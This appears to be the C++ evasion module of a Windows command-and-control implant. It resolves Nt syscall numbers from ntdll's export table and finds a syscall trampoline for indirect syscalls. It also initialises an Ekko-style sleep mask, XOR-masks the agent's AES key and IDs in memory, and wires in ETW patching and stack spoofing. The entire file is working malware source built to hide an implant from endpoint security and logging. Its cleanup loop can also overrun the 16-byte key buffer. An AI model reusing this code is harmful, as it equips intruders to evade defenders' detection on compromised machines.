#include <common.h>
#include <module.h>

using namespace stardust;

namespace starburst {

static auto declfn init_syscall_table( instance& inst ) -> void {
    auto base = reinterpret_cast<uint8_t*>( inst.ntdll.handle );
    if ( !base ) return;

    auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>( base );
    auto nt  = reinterpret_cast<IMAGE_NT_HEADERS*>( base + dos->e_lfanew );

    auto eat_rva  = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
    auto eat_size = nt->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;
    if ( !eat_rva ) return;

    auto eat       = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>( base + eat_rva );
    auto names     = reinterpret_cast<uint32_t*>( base + eat->AddressOfNames );
    auto ordinals  = reinterpret_cast<uint16_t*>( base + eat->AddressOfNameOrdinals );
    auto functions = reinterpret_cast<uint32_t*>( base + eat->AddressOfFunctions );

    for ( uint32_t i = 0; i < eat->NumberOfNames && inst.evasion.syscall_count < 64; i++ ) {
        auto name = reinterpret_cast<char*>( base + names[i] );

        if ( name[0] != 'N' || name[1] != 't' ) continue;
        if ( name[2] == 'D' && name[3] == 'l' && name[4] == 'l' ) continue;

        auto func_rva  = functions[ ordinals[i] ];

        // Skip forwarded exports (RVA falls within export directory range)
        if ( func_rva >= eat_rva && func_rva < eat_rva + eat_size ) continue;

        auto func_addr = base + func_rva;

        if ( func_addr[0] == 0x4C && func_addr[1] == 0x8B && func_addr[2] == 0xD1 &&
             func_addr[3] == 0xB8 ) {
            uint16_t ssn = *reinterpret_cast<uint16_t*>( func_addr + 4 );
            auto& entry = inst.evasion.syscall_table[ inst.evasion.syscall_count ];
            entry.hash = hash_string( name );
            entry.ssn  = ssn;
            inst.evasion.syscall_count++;
        }
    }

    auto sections = IMAGE_FIRST_SECTION( nt );
    for ( uint16_t s = 0; s < nt->FileHeader.NumberOfSections; s++ ) {
        if ( !( sections[s].Characteristics & IMAGE_SCN_MEM_EXECUTE ) ) continue;

        auto sec_base = base + sections[s].VirtualAddress;
        auto sec_size = sections[s].Misc.VirtualSize;

        for ( uint32_t j = 0; j + 2 < sec_size; j++ ) {
            if ( sec_base[j] == 0x0F && sec_base[j+1] == 0x05 && sec_base[j+2] == 0xC3 ) {
                for ( uint32_t k = 0; k < inst.evasion.syscall_count; k++ ) {
                    inst.evasion.syscall_table[k].trampoline = sec_base + j;
                }
                goto trampoline_found;
            }
        }
    }
trampoline_found:

    DBG_PRINT( inst, "syscall table: %d entries, trampoline=%p\n",
               inst.evasion.syscall_count,
               inst.evasion.syscall_count > 0 ? inst.evasion.syscall_table[0].trampoline : nullptr );
}

static auto declfn init_sleep_mask( instance& inst ) -> void {
    auto status = inst.bcrypt_mod.BCryptGenRandom(
        nullptr,
        inst.evasion.ekko.rc4_key,
        16,
        BCRYPT_USE_SYSTEM_PREFERRED_RNG
    );

    if ( status == 0 ) {
        inst.evasion.ekko.img_base = inst.base.address;
        inst.evasion.ekko.img_size = static_cast<uint32_t>( inst.base.length );
        inst.evasion.ekko.initialized = true;
        DBG_PRINT( inst, "sleep mask init: base=%p size=%u\n",
                   (void*)inst.evasion.ekko.img_base, inst.evasion.ekko.img_size );
    }
}

static auto declfn xor_sensitive_data( instance& inst ) -> void {
    auto key = inst.evasion.ekko.rc4_key;
    for ( uint32_t i = 0; i < 32; i++ ) {
        inst.agent.aes_key[i] ^= key[ i % 16 ];
    }
    for ( uint32_t i = 0; i < 36; i++ ) {
        inst.agent.uuid[i] ^= key[ i % 16 ];
        inst.agent.payload_uuid[i] ^= key[ i % 16 ];
    }
}

auto declfn evasion_on_init( instance& inst ) -> void {
    init_syscall_table( inst );
    init_sleep_mask( inst );

#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
    spoof_init( inst );
#endif

#ifdef INCLUDE_EVASION_ETW
    evasion_patch_etw( inst );
#endif
}

auto declfn evasion_on_cleanup( instance& inst ) -> void {
#if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
    spoof_cleanup( inst );
#endif

    for ( uint32_t i = 0; i < inst.evasion.syscall_count; i++ ) {
        inst.evasion.ekko.rc4_key[i] = 0;
    }
    inst.evasion.ekko.initialized = false;
}

#include <evasion/sleep_masks.h>

auto declfn evasion_pre_sleep( instance& inst ) -> void {
    mask_pre_sleep( inst );
}

auto declfn evasion_post_sleep( instance& inst ) -> void {
    mask_post_sleep( inst );
}

auto declfn evasion_ekko_sleep( instance& inst, uint32_t sleep_ms ) -> void {
#if SLEEP_MASK_TYPE == MASK_EKKO && defined(_WIN64)
    if ( inst.evasion.ekko.initialized ) {
        ekko_sleep( inst, sleep_ms );
        return;
    }
#endif
    /* Fallback: standard pre-sleep → delay → post-sleep cycle */
    evasion_pre_sleep( inst );
    LARGE_INTEGER delay;
    delay.QuadPart = -static_cast<LONGLONG>( sleep_ms ) * 10000LL;
    inst.ntdll.NtDelayExecution( FALSE, &delay );
    evasion_post_sleep( inst );
}

} // namespace starburst
